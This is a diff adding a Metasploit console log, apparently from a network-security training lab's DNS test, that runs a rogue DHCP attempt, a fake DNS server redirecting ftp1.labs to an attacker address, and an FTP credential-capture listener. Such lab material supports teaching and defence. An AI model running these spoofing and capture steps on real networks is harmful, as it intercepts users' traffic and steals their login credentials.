@@ -1,0 +1,27 @@
+[1m[34m[*][0m Spooling to file /home/w4sp-lab/w4sp_lab2/tests/dns/tmp_spool...
+resource (dns.rc)> use auxiliary/server/dhcp
+[0mresource (dns.rc)> set NETMASK 255.255.255.0
+[0mNETMASK => 255.255.255.0
+resource (dns.rc)> set DOMAINNAME 192.100.200.177
+[0mDOMAINNAME => 192.100.200.177
+resource (dns.rc)> set SET SRVHOST 192.100.200.177
+[0mSET => SRVHOST 192.100.200.177
+resource (dns.rc)> exploit -j -q
+[0m[1m[31m[-][0m Auxiliary failed: Msf::OptionValidateError The following options failed to validate: SRVHOST.
+resource (dns.rc)> use auxiliary/server/fakedns
+[0mresource (dns.rc)> set TARGETACTION FAKE
+[0mTARGETACTION => FAKE
+resource (dns.rc)> set TARGETDOMAIN ftp1.labs
+[0mTARGETDOMAIN => ftp1.labs
+resource (dns.rc)> set TARGETHOST 192.100.200.177
+[0mTARGETHOST => 192.100.200.177
+resource (dns.rc)> exploit -j -q
+[0m[1m[34m[*][0m Auxiliary module running as background job
+resource (dns.rc)> use auxiliary/server/capture/ftp
+[0mresource (dns.rc)> exploit
+[0m[1m[34m[*][0m Auxiliary module execution completed
+
+[1m[34m[*][0m Listening on 0.0.0.0:21...
+[1m[34m[*][0m Server started.
+[4mmsf[0m auxiliary([1m[31mftp[0m) [0m> j[Kexit
+[0m[1m[34m[*][0m Server stopped.
